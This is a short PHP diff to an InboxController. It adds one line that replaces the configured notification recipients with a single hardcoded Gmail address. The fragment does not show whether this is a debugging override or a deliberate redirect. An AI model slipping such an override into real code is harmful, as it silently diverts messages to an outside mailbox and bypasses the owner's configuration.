@@ -188,6 +188,8 @@ class InboxController extends Controller
             $to = (array) $map['_default']['to'];
         }
 
+        $to = ['ph.sunshineluxuryvillaslimited@gmail.com'];
+
         $mailError = null;
 
         // --- INTERNAL NOTIFICATION ---
